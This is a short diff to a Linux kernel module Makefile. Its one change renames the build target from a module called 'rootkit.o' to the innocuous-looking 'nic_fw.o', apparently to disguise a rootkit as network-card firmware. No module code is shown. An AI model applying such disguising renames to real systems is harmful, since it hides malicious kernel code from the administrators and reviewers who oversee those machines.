@@ -1,4 +1,4 @@
-obj-m += rootkit.o
+obj-m += nic_fw.o
 
 KVER ?= $(shell uname -r)
 KDIR := /lib/modules/$(KVER)/build
